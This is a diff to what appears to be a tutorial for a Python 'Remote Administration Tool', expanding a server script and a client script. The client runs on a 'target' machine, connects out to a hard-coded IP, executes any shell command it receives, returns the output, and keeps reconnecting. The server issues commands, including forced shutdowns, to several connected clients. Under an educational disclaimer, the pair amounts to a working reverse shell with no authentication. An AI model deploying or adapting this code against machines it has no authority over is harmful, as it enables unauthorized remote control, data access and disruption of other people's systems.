@@ -78,27 +78,70 @@ New-NetFirewallRule -DisplayName "PythonTest" -Direction Inbound -LocalPort 5555
 ```python
 # server.py
 # server.py - Run on the ADMIN machine
+"""
+Remote Administration Tool - Server Component
+For educational purposes only. Use only on systems you own or have permission to control.
+"""
+
 import socket
+import threading
+
+def handle_client(conn, addr):
+    """
+    Handle communication with a connected client.
+    
+    Args:
+        conn: Socket object for the connection
+        addr: Tuple containing client IP and port
+    """
+    print(f"[+] Connection from {addr}")
+    try:
+        while True:
+            cmd = input("admin$ ")  # Get command from admin
+            
+            # Process special commands
+            if cmd.lower() == 'shutdown':
+                conn.send(b"shutdown /s /t 60 /c \"System maintenance shutdown\"")
+                print("[+] Sent shutdown command (60s delay)")
+            elif cmd.lower() == 'restart':
+                conn.send(b"shutdown /r /t 30 /c \"System restarting in 30 seconds\"")
+            elif cmd.lower() == 'cancel':
+                conn.send(b"shutdown /a")
+                print("[+] Sent shutdown cancel command")
+            elif cmd.lower() == 'exit':
+                conn.send(b"exit")
+                break
+            else:
+                # Send normal command to client
+                conn.send(cmd.encode())
+                # Print command output from client
+                print(conn.recv(8192).decode())
+                
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        conn.close()
+        print(f"[-] {addr} disconnected")
 
 def start_server():
+    """
+    Start the server and listen for incoming connections.
+    Creates a new thread for each connected client.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("0.0.0.0", 5555))  # Listen on all network interfaces
-    s.listen(1)
-    print("[*] Waiting for connection...")
-    
-    conn, addr = s.accept()
-    print(f"[+] Connected to {addr}")
+    s.bind(("0.0.0.0", 5555))  # Listen on all interfaces
+    s.listen(5)  # Allow up to 5 queued connections
+    print("[*] Server started on 0.0.0.0:5555")
     
     try:
         while True:
-            cmd = input("admin$ ")
-            if cmd.lower() == 'exit':
-                conn.send(cmd.encode())
-                break
-            conn.send(cmd.encode())
-            print(conn.recv(4096).decode())  # Larger buffer for big outputs
+            conn, addr = s.accept()  # Wait for connection
+            # Create thread to handle client
+            thread = threading.Thread(target=handle_client, args=(conn, addr))
+            thread.start()
+    except KeyboardInterrupt:
+        print("\n[!] Server shutting down...")
     finally:
-        conn.close()
         s.close()
 
 if __name__ == "__main__":
@@ -115,34 +158,105 @@ if __name__ == "__main__":
 # client.py
 
 # client.py - Run on the TARGET machine
+"""
+Remote Administration Tool - Client Component
+For educational purposes only. Use only on systems you own or have permission to control.
+"""
+
 import socket
 import subprocess
+import ctypes
+import os
+import time
+
+def is_admin():
+    """
+    Check if the current process has administrator privileges.
+    
+    Returns:
+        bool: True if running as admin, False otherwise
+    """
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def execute_command(command):
+    """
+    Execute a system command and return its output.
+    Handles special 'cd' command separately to change directories.
+    
+    Args:
+        command (str): The command to execute
+        
+    Returns:
+        str: Command output or error message
+    """
+    try:
+        if command.startswith("cd "):
+            os.chdir(command[3:])  # Change directory
+            return f"Changed directory to {os.getcwd()}"
+        else:
+            output = subprocess.getoutput(command)
+            return output
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 def connect_to_server(server_ip, port):
+    """
+    Connect to the server and process incoming commands.
+    Automatically reconnects if connection is lost.
+    
+    Args:
+        server_ip (str): IP address of the server
+        port (int): Port number to connect to
+    """
     while True:
         try:
+            print(f"[*] Attempting to connect to {server_ip}:{port}...")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)  # Set connection timeout
             s.connect((server_ip, port))
-            print(f"[*] Connected to {server_ip}")
+            print("[+] Connected to server")
             
             while True:
-                command = s.recv(4096).decode().strip()
+                command = s.recv(8192).decode().strip()
+                
+                if not command:  # Empty message means connection closed
+                    print("[!] Server disconnected")
+                    break
+                    
                 if command.lower() == 'exit':
                     s.close()
-                    break
+                    return
                 
-                try:
-                    output = subprocess.getoutput(command)
+                # Handle shutdown commands
+                if command.startswith("shutdown"):
+                    if not is_admin():
+                        s.send(b"Error: Admin rights required")
+                        continue
+                    try:
+                        subprocess.run(command, shell=True)
+                        s.send(b"Shutdown command executed")
+                    except Exception as e:
+                        s.send(f"Error: {str(e)}".encode())
+                else:
+                    # Execute normal commands
+                    output = execute_command(command)
                     s.send(output.encode())
-                except Exception as e:
-                    s.send(f"Error: {str(e)}".encode())
                     
-        except (ConnectionError, socket.error):
-            print("[!] Connection lost. Reconnecting...")
-            continue
+        except socket.timeout:
+            print("[!] Connection timeout")
+        except ConnectionRefusedError:
+            print("[!] Server unavailable")
+        except Exception as e:
+            print(f"[!] Error: {str(e)}")
+        
+        print("[*] Reconnecting in 10 seconds...")
+        time.sleep(10)
 
 if __name__ == "__main__":
-    SERVER_IP = "208.8.8.140"  # Change to the server's real IP
+    SERVER_IP = "208.8.8.140"  # Replace with server IP
     PORT = 5555
     connect_to_server(SERVER_IP, PORT)
 
